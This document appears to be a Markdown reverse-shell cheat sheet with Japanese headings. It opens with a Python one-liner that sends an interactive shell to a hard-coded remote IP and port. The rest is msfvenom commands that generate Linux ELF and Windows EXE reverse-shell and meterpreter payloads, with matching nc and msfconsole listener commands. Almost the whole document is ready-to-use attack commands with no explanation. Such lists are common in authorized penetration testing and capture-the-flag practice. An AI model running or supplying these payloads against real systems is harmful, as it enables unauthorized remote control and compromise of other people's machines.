# Python
#### Linux only
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.1.1.246",4080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
# msfvenom
# ***<span style="color:blue;">Linux</span>***
### <span style="color:IndianRed;">Linux(64bit)</span>
```
msfvenom -p linux/x64/shell_reverse_tcp lhost=[LHOST] lport=[LPORT] -f elf > shell.elf // 64bit-unstaged
```
### <span style="color:IndianRed;">Linux(32bit)</span>
```
msfvenom -p linux/x86/shell_reverse_tcp lhost=[LHOST] lport=[LPORT] -f elf > shell.elf // 32bit-unstaged
```
### <span style="color:Orange;">ncリスナー</span>
```
nc -lnvp 443
```
### <span style="color:IndianRed;">Linux(meterpreter 64bit)</span>
```
msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=[LHOST] lport=[LPORT] -f elf > shell.elf // 64bit-meterpreter-staged
```
### <span style="color:Orange;">meterpreterペイロードリスナー(64bit)</span>
```
msfconsole -q -x "use multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set lhost [IP]; set lport [port]; exploit"
```
### <span style="color:IndianRed;">Linux(meterpreter 32bit)</span>
```
msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=[LHOST] lport=[LPORT] -f elf > shell.elf // 32bit-meterpreter
```
### <span style="color:Orange;">meterpreterペイロードリスナー(32bit)</span>
```
sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST [IP]; set LPORT [port]; exploit"
```   
***
-----
# ***<span style="color:blue;">Windows</span>***
### <span style="color:DeepSkyBlue;">Windows(64bit)</span>
```
msfvenom -p windows/x64/shell_reverse_tcp lhost=[LHOST] lport=[LPORT] -f exe > shell.exe // 64bit-unsataged 
```
### <span style="color:DeepSkyBlue;">Windows(32bit)</span>
```
msfvenom -p windows/shell_reverse_tcp lhost=[LHOST] lport=[LPORT] -f exe > shell.exe // 32bit-unsataged
```
### <span style="color:Orange;">ncリスナー</span>
```
nc -lnvp 443
```
----
### <span style="color:DeepSkyBlue;">windows(meterpreter 64bit)</span>
```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=[LHOST] lport=[LPORT] -f exe > shell.exe // 64bit-meterpreter-sataged
```
### <span style="color:Orange;">meterpreterペイロードリスナー(64bit)</span>
```
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost [IP]; set lport [PORT]; exploit"
```
----
### <span style="color:DeepSkyBlue;">windows(meterpreter 32bit)</span>
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=[LHOST] lport=[LPORT] -f exe > shell.exe // 32bit-meterpreter-sataged
```
### <span style="color:Orange;">meterpreterペイロードリスナー(32bit)</span>
```
msfconsole -q -x "use multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost [IP]; set lport [PORT]; exploit"
```